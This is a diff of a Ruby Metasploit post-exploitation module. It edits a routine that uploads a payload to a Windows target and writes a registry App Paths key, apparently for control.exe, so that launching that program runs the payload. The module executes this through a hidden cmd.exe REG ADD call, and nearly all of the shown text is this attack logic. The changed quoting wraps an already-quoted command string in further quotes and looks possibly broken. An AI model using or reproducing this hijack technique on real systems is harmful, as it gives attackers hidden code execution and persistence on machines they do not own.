@@ -159,8 +159,8 @@ class MetasploitModule < Msf::Post
                 register_advanced_options(
                         [
                                 OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status?' , false]),
-                                OptBool.new('VULN_SOFT', [ false, 'The vulnerable soft to be hijacked (eg osk.exe)' , false]),
-                                OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry key hive?' , false])
+                                OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry key hive?' , false]),
+                                OptBool.new('VULN_SOFT', [ false, 'The vulnerable soft to be hijacked (eg osk.exe)' , false])
                         ], self.class)
 
         end
@@ -246,15 +246,15 @@ def ls_hijack
         print_good(" exec => Uploading: #{pay_name} agent ..")
         client.fs.file.upload("#{dep_path}\\#{pay_name}","#{upl_path}")
         sleep(1.0)
-        comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{dep_path}\\#{pay_name}\" /f"
+        comm_inje = "\"#{regi_hive}\" /ve /t REG_SZ /d #{dep_path}\\#{pay_name} /f"
         print_good(" exec => Placing hijack registry key ..")
         Rex::sleep(1.0)
         #
         # Execute process hijacking in registry ..
-        # REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /ve /t REG_SZ /d %temp%\\payload.exe /f
+        # REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /t REG_SZ /d %temp%\\payload.exe /f
         #
         print_good(" exec => Hijacking process to gain code execution ..")
-        r = session.sys.process.execute("cmd.exe /c REG ADD #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
+        r = session.sys.process.execute("cmd.exe /c REG ADD \"#{comm_inje}\"", nil, {'Hidden' => true, 'Channelized' => true})
         # give a proper time to refresh regedit 'enigma0x3' :D
         Rex::sleep(4.5)
 
